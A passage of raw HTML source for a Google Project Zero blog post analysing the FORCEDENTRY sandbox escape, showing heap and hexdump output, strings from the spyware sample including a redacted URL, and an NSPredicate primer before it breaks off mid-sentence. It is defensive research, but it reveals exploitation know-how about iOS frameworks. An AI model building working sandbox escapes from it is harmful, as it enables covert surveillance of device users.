th{padding:0}.YDzVciBUld-c8{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.YDzVciBUld-c16{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.YDzVciBUld-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.YDzVciBUld-c10{color:#434343;text-decoration:none;vertical-align:baseline;font-size:14pt;font-style:normal}.YDzVciBUld-c13{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:italic}.YDzVciBUld-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.YDzVciBUld-c2{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.YDzVciBUld-c6{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.YDzVciBUld-c17{background-color:#b6d7a8;font-family:\"Courier New\";font-weight:700}.YDzVciBUld-c15{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.YDzVciBUld-c3{font-weight:400;font-family:\"Arial\"}.YDzVciBUld-c0{font-weight:400;font-family:\"Courier New\"}.YDzVciBUld-c11{color:inherit;text-decoration:inherit}.YDzVciBUld-c14{font-style:italic}.YDzVciBUld-c12{text-indent:36pt}.YDzVciBUld-c5{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"YDzVciBUld-c15\"&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Posted by Ian Beer &amp;amp; &lt;/span&gt;&lt;span&gt;Samuel Gro&amp;szlig;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;of Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c13 YDzVciBUld-c3\"&gt;We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&amp;rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely Project Zero&amp;rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Late last year &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;we published a writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit attributed by Citizen Lab to NSO.&lt;/span&gt;&lt;span&gt;&amp;nbsp;By sending a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;iMessage attachment (which was really a PDF) NSO were able to remotely trigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://en.wikipedia.org/wiki/Weird_machine\"&gt;weird machine&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;capable of loading the next stage in the infection process: the sandbox escape.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;In this post we&amp;#39;ll take a look at that sandbox escape. It&amp;#39;s notable for using only logic bugs. In fact it&amp;#39;s unclear where the features that it uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer Authentication and Memory Tagging have no impact at all on this sandbox escape.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.80ze3m83kn16\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;An observation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;During our initial analysis of the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;file Samuel noticed that rendering the image appeared to leak memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Running the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;heap&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;tool after releasing all the associated resources gave the following output:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;$ heap $pid&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;All zones: 4631 nodes (826336 bytes) &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp;COUNT &amp;nbsp; &amp;nbsp;BYTES &amp;nbsp; &amp;nbsp; AVG &amp;nbsp; CLASS_NAME &amp;nbsp; TYPE &amp;nbsp; BINARY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp;===== &amp;nbsp; &amp;nbsp;===== &amp;nbsp; &amp;nbsp; === &amp;nbsp; ========== &amp;nbsp; ==== &amp;nbsp; ====== &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; 1969 &amp;nbsp; 469120 &amp;nbsp; 238.3 &amp;nbsp; non-object &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;825 &amp;nbsp; &amp;nbsp;26400 &amp;nbsp; &amp;nbsp;32.0 &amp;nbsp; JBIG2Bitmap &amp;nbsp;C++ &amp;nbsp; CoreGraphics&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;heap&lt;/span&gt;&lt;span&gt;&amp;nbsp;was able to determine that the leaked memory contained &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;objects.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Using the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;-address&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;option we could find all the individual leaked bitmap objects:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;$ heap -address JBIG2Bitmap $pid&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;and dump them out to files. &lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;One of those objects was quite unlike the others:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;$ hexdump -C dumpXX.bin | head&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000000 &amp;nbsp;62 70 6c 69 73 74 30 30 &amp;nbsp;|bplist00|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000018 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;24 76 65 72 73 69 &amp;nbsp;| &amp;nbsp;$versi|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000020 &amp;nbsp;6f 6e 59 24 61 72 63 68 &amp;nbsp;|onY$arch|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000028 &amp;nbsp;69 76 65 72 58 24 6f 62 &amp;nbsp;|iverX$ob|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000030 &amp;nbsp;6a 65 63 74 73 54 24 74 &amp;nbsp;|jectsT$t|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000038 &amp;nbsp;6f 70 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;|op &amp;nbsp; &amp;nbsp; &amp;nbsp;|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000040 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;4e 53 4b 65 79 65 &amp;nbsp;| &amp;nbsp;NSKeye|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;00000048 &amp;nbsp;64 41 72 63 68 69 76 65 &amp;nbsp;|dArchive|&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;It&amp;#39;s clearly a serialized &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6 YDzVciBUld-c0\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc\"&gt;NSKeyedArchiver&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Definitely not what you&amp;#39;d expect to see in a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;object. Running &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;strings&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;we see plenty of interesting things (noting that the URL below is redacted):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;Objective-C class and selector names:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSConstantValueExpression&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSConstantValue&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;expressionValueWithObject:context:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;filteredArrayUsingPredicate:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;_web_removeFileOnlyAtPath:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;context:evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;performSelectorOnMainThread:withObject:waitUntilDone:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;The name of the file which delivered the exploit:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;XXX.gif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;Filesystems paths:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;/tmp/com.apple.messages&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;a URL:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c5\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Using &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;plutil&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can convert the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;bplist00&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary format to XML. Performing some post-processing and cleanup we can see that the top-level object in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSKeyedArchiver&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a serialized &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;object.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.1ai2h2r4yshv\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;NSExpression NSPredicate NSExpression&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;If you&amp;#39;ve ever used Core Data or tried to filter a Objective-C collection you might have come across &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nspredicate?language=objc\"&gt;According to Apple&amp;#39;s public documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;they are used &lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c14\"&gt;to define logical conditions for constraining a search for a fetch or for in-memory filtering&lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c13 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;For example, in Objective-C you could filter an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSArray&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;object like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; NSArray* names = @[@&amp;quot;one&amp;quot;, @&amp;quot;two&amp;quot;, @&amp;quot;three&amp;quot;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; NSPredicate* pred;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; pred = [NSPredicate predicateWithFormat:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; @&amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c17\"&gt;SELF beginswith[c] &amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;quot;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; NSLog(@&amp;quot;%@&amp;quot;, [names filteredArrayUsingPredicate:pred]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The predicate is &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;SELF beginswith[c] &amp;#39;t&amp;#39;&amp;quot;&lt;/span&gt;&lt;span&gt;. This prints an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing only &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;two&lt;/span&gt;&lt;span&gt;&amp;quot; and &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;three&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[NSPredicate predicateWithFormat]&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;builds a predicate object by parsing a small query language, a little like an SQL query. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be built up from &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;, connected by &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSComparisonPredicates&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;(like less-than, greater-than and so on.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;themselves can be fairly complex, containing aggregate expressions (like &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;IN&lt;/span&gt;&lt;span&gt;&amp;quot; and &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CONTAINS&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot;), subqueries, set expressions, and, most interestingly, function expressions.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Prior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;sum&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;count&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;min&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;max&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;average&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;But starting in OS X 10.5 (which would also be around the launch of iOS in 2007) &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;were extended&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nsexpression\"&gt;to allow 